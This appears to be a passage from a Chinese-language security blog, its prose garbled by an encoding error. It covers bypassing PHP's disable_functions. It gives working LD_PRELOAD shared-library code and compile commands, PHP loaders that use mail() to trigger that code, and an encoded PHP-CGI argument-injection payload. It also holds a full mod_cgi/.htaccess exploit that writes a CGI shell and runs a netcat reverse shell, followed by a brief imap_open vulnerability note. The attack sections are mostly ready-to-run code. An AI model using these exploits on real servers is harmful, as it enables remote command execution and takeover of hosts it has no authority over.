<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;ls &gt; result.txt&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span>  <span class="title">geteuid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) </span><br><span class="line">    &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">  	&#125;</span><br></pre></td></tr></table></figure>

<p>å½“è¿™ä¸ªå…±äº«åº“ä¸­çš„ <code>geteuid</code> è¢«è°ƒç”¨æ—¶ï¼Œå°è¯•åŠ è½½ <code>payload()</code> å‡½æ•°ï¼Œæ‰§è¡Œå‘½ä»¤ã€‚è¿™ä¸ªæµ‹è¯•å‡½æ•°å†™çš„å¾ˆç®€å•ï¼Œå®é™…åº”ç”¨æ—¶å¯ç›¸åº”è°ƒæ•´å®Œå–„ã€‚åœ¨æ”»å‡»æœºä¸Šï¼ˆæ³¨æ„ç¼–è¯‘å¹³å°åº”å’Œé¶æœºå¹³å°ç›¸è¿‘ï¼Œè‡³å°‘ä¸èƒ½ä¸€ä¸ªæ˜¯ 32 ä½ä¸€ä¸ªæ˜¯ 64 ä½ï¼‰æŠŠå®ƒç¼–è¯‘ä¸ºä¸€ä¸ªä½ç½®ä¿¡æ¯æ— å…³çš„åŠ¨æ€å…±äº«åº“ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC hack.c -o hack</span><br><span class="line">gcc -shared hack -o hack.so</span><br></pre></td></tr></table></figure>

<h4 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h4><p>å°†æ¶æ„çš„.soæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨</p>
<p>æ‰§è¡Œå¦‚ä¸‹ä»£ç ,å³å¯è½½å…¥æ¶æ„å‘½ä»¤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;[email protected]&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="ç›¸å…³æ–‡ç« "><a href="#ç›¸å…³æ–‡ç« " class="headerlink" title="ç›¸å…³æ–‡ç« "></a>ç›¸å…³æ–‡ç« </h4><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html</a></p>
<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]">https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#8-mail-%E7%AC%AC%E4%BA%94%E4%B8%AA%E5%8F%82%E6%95%B0-excrt-cmd]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2019/02/12/PHP">https://www.k0rz3n.com/2019/02/12/PHP</a> ä¸­å¯ä»¥åˆ©ç”¨çš„å±é™©çš„å‡½æ•°/#8-mail-ç¬¬äº”ä¸ªå‚æ•°-excrt-cmd)</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/169156.html">https://www.freebuf.com/articles/web/169156.html</a></p>
<h3 id="without-sendmail"><a href="#without-sendmail" class="headerlink" title="without sendmail"></a>without sendmail</h3><p> <a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/02/%E6%B5%85%E8%B0%88%E5%87%A0%E7%A7%8DBypass-disable-functions%E7%9A%84%E6%96%B9%E6%B3%95/#Method2%E2%80%94%E2%80%94%E5%8A%AB%E6%8C%81%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B">å‚è€ƒé“¾æ¥</a> </p>
<blockquote>
<p>å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£æˆ‘å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº†ã€‚è¿™ç§åœºæ™¯ä¸ C++ çš„æ„é€ å‡½æ•°ç®€ç›´ç¥ä¼¼ï¼</p>
<p>GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ <code>__attribute__((constructor))</code>ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ <code>__attribute__((constructor))</code> ä¿®é¥°çš„å‡½æ•°ã€‚è¿™ä¸€ç»†èŠ‚éå¸¸é‡è¦ï¼Œå¾ˆå¤šæœ‹å‹ç”¨ LD_PRELOAD æ‰‹æ³•çªç ´ disable_functions æ— æ³•åšåˆ°ç™¾åˆ†ç™¾æˆåŠŸï¼Œæ­£å› ä¸ºè¿™ä¸ªåŸå› ï¼Œ<strong>ä¸è¦å±€é™äºä»…åŠ«æŒæŸä¸€å‡½æ•°ï¼Œè€Œåº”è€ƒè™‘æ‹¦åŠ«å¯åŠ¨è¿›ç¨‹è¿™ä¸€è¡Œä¸º</strong>ã€‚</p>
<p>æ­¤å¤–ï¼Œæˆ‘é€šè¿‡ LD_PRELOAD åŠ«æŒäº†å¯åŠ¨è¿›ç¨‹çš„è¡Œä¸ºï¼ŒåŠ«æŒååˆå¯åŠ¨äº†å¦å¤–çš„æ–°è¿›ç¨‹ï¼Œè‹¥ä¸åœ¨æ–°è¿›ç¨‹å¯åŠ¨å‰å–æ¶ˆ LD_PRELOADï¼Œåˆ™å°†é™·å…¥æ— é™å¾ªç¯ï¼Œæ‰€ä»¥å¿…é¡»å¾—åˆ é™¤ç¯å¢ƒå˜é‡ LD_PRELOADã€‚æœ€ç›´è§‚çš„åšæ³•æ˜¯è°ƒç”¨ <code>unsetenv(&quot;LD_PRELOAD&quot;)</code>ï¼Œè¿™åœ¨å¤§éƒ¨ä»½ linux å‘è¡Œå¥—ä»¶ä¸Šçš„ç¡®å¯è¡Œï¼Œä½†åœ¨ centos ä¸Šå´æ— æ•ˆï¼Œç©¶å…¶åŸå› ï¼Œcentos è‡ªå·±ä¹Ÿ hook äº† unsetenv()ï¼Œåœ¨å…¶å†…éƒ¨å¯åŠ¨äº†å…¶ä»–è¿›ç¨‹ï¼Œæ ¹æœ¬æ¥ä¸åŠåˆ é™¤ LD_PRELOAD å°±åˆè¢«åŠ«æŒï¼Œå¯¼è‡´æ— é™å¾ªç¯ã€‚æ‰€ä»¥ï¼Œæˆ‘å¾—æ‰¾ä¸€ç§æ¯” unsetenv() æ›´ç›´æ¥çš„åˆ é™¤ç¯å¢ƒå˜é‡çš„æ–¹å¼ã€‚æ˜¯å®ƒï¼Œå…¨å±€å˜é‡ <code>extern char** environ</code>ï¼å®é™…ä¸Šï¼Œunsetenv() å°±æ˜¯å¯¹ environ çš„ç®€å•å°è£…å®ç°çš„ç¯å¢ƒå˜é‡åˆ é™¤åŠŸèƒ½ã€‚</p>
</blockquote>
<h4 id="ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡"><a href="#ç”±äºopen-basedir-webç›®å½•ä¸å¯å†™ç»•è¿‡" class="headerlink" title="ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡"></a>ç”±äºopen_basedir+webç›®å½•ä¸å¯å†™ç»•è¿‡</h4><p>è§ bypass open_basedir çš„ tmpfileéƒ¨åˆ†</p>
<h4 id="æ”»å‡»åˆ©ç”¨"><a href="#æ”»å‡»åˆ©ç”¨" class="headerlink" title="æ”»å‡»åˆ©ç”¨"></a>æ”»å‡»åˆ©ç”¨</h4><p>bypass_disablefunc.c</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">extern char** environ;</span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ç€ç”¨ä»¥ä¸‹è¯­å¥ç¼–è¯‘Cæ–‡ä»¶ä¸ºå…±äº«å¯¹è±¡æ–‡ä»¶ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so</span><br></pre></td></tr></table></figure>

<p>bypass_disablefunc.phpï¼Œä»£ç å’Œtest.phpä¸€è‡´ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="string">&quot;/tmp/cmdout&quot;</span>;</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line">    <span class="variable">$so_path</span> = <span class="string">&quot;/var/www/html/bypass_disablefunc.so&quot;</span>;</span><br><span class="line">    putenv(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line">    mail(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . nl2br(file_get_contents(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    unlink(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="apache-php-cgi-modæ”»å‡»"><a href="#apache-php-cgi-modæ”»å‡»" class="headerlink" title="apache+php cgi modæ”»å‡»"></a>apache+php cgi modæ”»å‡»</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>phpä½œä¸ºcgiæ¨¡å¼è¿è¡Œçš„æ—¶å€™ï¼Œæ¥å—-s  -d -c è¿™æ ·çš„å‚æ•°ï¼Œæˆ‘ä»¬çœ‹çœ‹è¿™äº›å‚æ•°çš„åŠŸèƒ½</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s Output HTML syntax highlighted source -d foo[=bar] Define INI entry foo with value bar</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†çœ‹çœ‹æ”»å‡»ä»£ç ç‰‡æ®µ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char poststr[] = <span class="string">&quot;POST %s?%%2D%%64+%%61%%6C%%6C%%6F%%77%%5F&quot;</span> \ <span class="string">&quot;%%75%%72%%6C%%5F%%69%%6E%%63%%6C%%75%%64%%65%%3D%%6F%%6E+%%2D%%64&quot;</span> \ <span class="string">&quot;+%%73%%61%%66%%65%%5F%%6D%%6F%%64%%65%%3D%%6F%%66%%66+%%2D%%64+%%73&quot;</span> \ <span class="string">&quot;%%75%%68%%6F%%73%%69%%6E%%2E%%73%%69%%6D%%75%%6C%%61%%74%%69%%6F%%6E&quot;</span> \ <span class="string">&quot;%%3D%%6F%%6E+%%2D%%64+%%64%%69%%73%%61%%62%%6C%%65%%5F%%66%%75%%6E%%63&quot;</span> \ <span class="string">&quot;%%74%%69%%6F%%6E%%73%%3D%%22%%22+%%2D%%64+%%6F%%70%%65%%6E%%5F%%62&quot;</span> \ <span class="string">&quot;%%61%%73%%65%%64%%69%%72%%3D%%6E%%6F%%6E%%65+%%2D%%64+%%61%%75%%74&quot;</span> \ <span class="string">&quot;%%6F%%5F%%70%%72%%65%%70%%65%%6E%%64%%5F%%66%%69%%6C%%65%%3D%%70%%68&quot;</span> \ <span class="string">&quot;%%70%%3A%%2F%%2F%%69%%6E%%70%%75%%74+%%2D%%64+%%63%%67%%69%%2E%%66%%6F&quot;</span> \ <span class="string">&quot;%%72%%63%%65%%5F%%72%%65%%64%%69%%72%%65%%63%%74%%3D%%30+%%2D%%64+%%63&quot;</span> \ <span class="string">&quot;%%67%%69%%2E%%72%%65%%64%%69%%72%%65%%63%%74%%5F%%73%%74%%61%%74%%75%%73&quot;</span> \ <span class="string">&quot;%%5F%%65%%6E%%76%%3D%%30+%%2D%%6E HTTP/1.1\r\n&quot;</span> \</span><br></pre></td></tr></table></figure>



<p>è§£ç å‡ºæ¥æ˜¯</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%s?-d allow_url_include=on -d safe_mode=off -d suhosin.simulation3Don -d disable_functions=<span class="string">&quot;&quot;</span> -d open_basedir=none -d auto_prepend_file=php:<span class="comment">//input -d cgi.fo&quot;rce_redirect=0 -d cgi.redirect_status_env=0 -n</span></span><br></pre></td></tr></table></figure>



<p>è¿™æ ·Kingcopeçš„æ”»å‡»ä»£ç æ€è·¯å°±å‡ºæ¥äº†ã€‚</p>
<p>å…³é—­å„ç§é˜²æŠ¤çš„å‚æ•°ï¼Œæ‰“å¼€å„ç§å±é™©çš„å‚æ•°ï¼Œæœ€ååˆ©ç”¨auto_prepend_fileï¼ˆæˆ–auto_append_fileï¼‰è¿™ä¸ªå‚æ•°æŠŠé»‘å®¢éœ€è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ä¼ é€’è¿‡å»äº†ã€‚</p>
<h3 id="åˆ©ç”¨æ¡ä»¶"><a href="#åˆ©ç”¨æ¡ä»¶" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>1ã€apache+phpæ˜¯ç”¨cgiæ¨¡å¼è·‘çš„ï¼Œä¾‹å¦‚apacheçš„mod_cgid</p>
<p>2ã€phpè§£é‡Šå™¨éœ€è¦å¯ä»¥ä»ä¸‹é¢çš„urlè®¿é—®åˆ°ï¼Œå½“ç„¶æˆ–è®¸å¯èƒ½æ˜¯å…¶ä»–çš„urlï¼Œè¿™ä¸ªå…·ä½“è¦çœ‹ä½ çš„é…ç½®</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/cgi-bin/php</span><br><span class="line">/cgi-bin/php5</span><br><span class="line">/cgi-bin/php-cgi</span><br><span class="line">/cgi-bin/php.cgi</span><br><span class="line">/cgi-bin/php4</span><br></pre></td></tr></table></figure>

<p>3ã€phpç‰ˆæœ¬<br>PHPç‰ˆæœ¬å°äº5.3.12<br>PHPç‰ˆæœ¬å°äº5.4.2</p>
<p>æˆ–è€…</p>
<ol>
<li> mod_cgiå·²ç»å¯ç”¨ </li>
<li> å¿…é¡»å…è®¸.htaccessæ–‡ä»¶ , åœ¨httpd.confä¸­ï¼Œè¦æ³¨æ„AllowOverrideé€‰é¡¹ä¸ºAll </li>
<li> å¿…é¡»æœ‰æƒé™å†™.htaccessæ–‡ä»¶</li>
</ol>
<h3 id="åˆ©ç”¨è„šæœ¬"><a href="#åˆ©ç”¨è„šæœ¬" class="headerlink" title="åˆ©ç”¨è„šæœ¬"></a>åˆ©ç”¨è„šæœ¬</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;nc -c&#x27;/bin/bash&#x27; 127.0.0.1 4444&quot;</span>; <span class="comment">//åå¼¹ä¸€ä¸ªshellå‡ºæ¥ï¼Œè¿™é‡Œç”¨æœ¬åœ°çš„4444ç«¯å£</span></span><br><span class="line"><span class="variable">$shellfile</span> =<span class="string">&quot;#!/bin/bash\n&quot;</span>; <span class="comment">//æŒ‡å®šshell</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;echo -ne \&quot;Content-Type: text/html\\n\\n\&quot;\n&quot;</span>; <span class="comment">//éœ€è¦æŒ‡å®šè¿™ä¸ªheaderï¼Œå¦åˆ™ä¼šè¿”å›500</span></span><br><span class="line"><span class="variable">$shellfile</span> .=<span class="string">&quot;<span class="subst">$cmd</span>&quot;</span>; </span><br><span class="line">functioncheckEnabled(<span class="variable">$text</span>,<span class="variable">$condition</span>,<span class="variable">$yes</span>,<span class="variable">$no</span>) <span class="comment">//this surely can be shorter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$text</span>: &quot;</span> . (<span class="variable">$condition</span> ?<span class="variable">$yes</span> : <span class="variable">$no</span>) . <span class="string">&quot;&lt;br&gt;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;checked&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    @file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;\nSetEnv HTACCESS on&quot;</span>, FILE_APPEND); </span><br><span class="line">    header(<span class="string">&#x27;Location: &#x27;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]. <span class="string">&#x27;?checked=true&#x27;</span>); <span class="comment">//æ‰§è¡Œç¯å¢ƒçš„æ£€æŸ¥</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$modcgi</span> = in_array(<span class="string">&#x27;mod_cgi&#x27;</span>,apache_get_modules()); <span class="comment">// æ£€æµ‹mod_cgiæ˜¯å¦å¼€å¯</span></span><br><span class="line">    <span class="variable">$writable</span> = is_writable(<span class="string">&#x27;.&#x27;</span>); <span class="comment">//æ£€æµ‹å½“å‰ç›®å½•æ˜¯å¦å¯å†™</span></span><br><span class="line">    <span class="variable">$htaccess</span> = !<span class="keyword">empty</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTACCESS&#x27;</span>]);<span class="comment">//æ£€æµ‹æ˜¯å¦å¯ç”¨äº†.htaccess</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Mod-Cgienabled&quot;</span>,<span class="variable">$modcgi</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;Iswritable&quot;</span>,<span class="variable">$writable</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">        checkEnabled(<span class="string">&quot;htaccessworking&quot;</span>,<span class="variable">$htaccess</span>,<span class="string">&quot;Yes&quot;</span>,<span class="string">&quot;No&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$modcgi</span> &amp;&amp; <span class="variable">$writable</span>&amp;&amp; <span class="variable">$htaccess</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Error. All of the above mustbe true for the script to work!&quot;</span>; <span class="comment">//å¿…é¡»æ»¡è¶³æ‰€æœ‰æ¡ä»¶</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       </span><br><span class="line"> checkEnabled(<span class="string">&quot;Backing </span></span><br><span class="line"><span class="string">up.htaccess&quot;</span>,copy(<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.htaccess.bak&quot;</span>),<span class="string">&quot;Suceeded!Saved in </span></span><br><span class="line"><span class="string">.htaccess.bak&quot;</span>,<span class="string">&quot;Failed!&quot;</span>); <span class="comment">//å¤‡ä»½ä¸€ä¸‹åŸæœ‰.htaccess</span></span><br><span class="line">        </span><br><span class="line">checkEnabled(<span class="string">&quot;Write </span></span><br><span class="line"><span class="string">.htaccessfile&quot;</span>,file_put_contents(<span class="string">&#x27;.htaccess&#x27;</span>,<span class="string">&quot;Options </span></span><br><span class="line"><span class="string">+ExecCGI\nAddHandlercgi-script </span></span><br><span class="line"><span class="string">.dizzle&quot;</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//.dizzleï¼Œæˆ‘ä»¬çš„ç‰¹å®šæ‰©å±•å</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Write shellfile&quot;</span>,file_put_contents(<span class="string">&#x27;shell.dizzle&#x27;</span>,<span class="variable">$shellfile</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//å†™å…¥æ–‡ä»¶</span></span><br><span class="line">        checkEnabled(<span class="string">&quot;Chmod777&quot;</span>,chmod(<span class="string">&quot;shell.dizzle&quot;</span>,<span class="number">0777</span>),<span class="string">&quot;Succeeded!&quot;</span>,<span class="string">&quot;Failed!&quot;</span>);<span class="comment">//ç»™æƒé™</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Executing the script now.Check your listener &lt;img src = &#x27;shell.dizzle&#x27; style =&#x27;display:none;&#x27;&gt;&quot;</span>; <span class="comment">//è°ƒç”¨</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open"></a>imap_open</h2><blockquote>
<p>PHP çš„imap_openå‡½æ•°ä¸­çš„æ¼æ´å¯èƒ½å…è®¸ç»è¿‡èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´çš„å­˜åœ¨æ˜¯å› ä¸ºå—å½±å“çš„è½¯ä»¶çš„imap_openå‡½æ•°åœ¨å°†é‚®ç®±åç§°ä¼ é€’ç»™rshæˆ–sshå‘½ä»¤ä¹‹å‰ä¸æ­£ç¡®åœ°è¿‡æ»¤é‚®ç®±åç§°ã€‚å¦‚æœå¯ç”¨äº†rshå’ŒsshåŠŸèƒ½å¹¶ä¸”rshå‘½ä»¤æ˜¯sshå‘½ä»¤çš„ç¬¦å·é“¾æ¥ï¼Œåˆ™æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘ç›®æ ‡ç³»ç»Ÿå‘é€åŒ…å«-oProxyCommandå‚æ•°çš„æ¶æ„IMAPæœåŠ¡å™¨åç§°æ¥åˆ©ç”¨æ­¤æ¼æ´ã€‚æˆåŠŸçš„æ”»å‡»å¯èƒ½å…è®¸æ”»å‡»è€…ç»•è¿‡å…¶ä»–ç¦ç”¨çš„exec å—å½±å“è½¯ä»¶ä¸­çš„åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¿™äº›åŠŸèƒ½åœ¨ç›®æ ‡ç³»ç»Ÿä¸Šæ‰§è¡Œä»»æ„shellå‘½ä»¤ã€‚åˆ©ç”¨æ­¤æ¼æ´çš„åŠŸèƒ½ä»£ç æ˜¯Metasploit Frameworkçš„ä¸€éƒ¨åˆ†ã€‚ </p>
</blockquote>
<h3 id="åˆ©ç”¨æ¡ä»¶-1"><a href="#åˆ©ç”¨æ¡ä»¶-1" class="headerlink" title="åˆ©ç”¨æ¡ä»¶"></a>åˆ©ç”¨æ¡ä»¶</h3><p>å­˜åœ¨sshå’ŒrshåŠŸèƒ½ ä¸”  enable_insecure_rsh = true</p>
